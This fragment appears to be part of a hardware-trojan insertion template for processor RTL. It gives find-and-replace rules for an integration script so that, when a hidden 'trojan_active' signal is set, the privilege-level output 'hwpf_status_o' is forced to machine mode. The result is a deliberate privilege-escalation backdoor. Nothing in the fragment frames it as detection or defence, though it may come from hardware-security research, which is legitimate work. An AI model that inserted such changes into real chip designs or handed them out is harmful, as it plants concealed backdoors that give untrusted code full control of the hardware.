 ...
 * Payload: Force hwpf_status_o = PRIV_LVL_M
 * 
...
// ============================================================
// Privilege Escalation: Force hwpf_status_o to Machine mode
//
// Integration Script Must Modify:
//
// IF hwpf_status_o is assigned in always_ff:
//   Find: hwpf_status_o <= next_priv_level;
//   Replace: hwpf_status_o <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF hwpf_status_o is conditional:
//   Find: if (condition) hwpf_status_o <= new_level;
//   Replace: if (condition) hwpf_status_o <= trojan_active ? PRIV_LVL_M : new_level;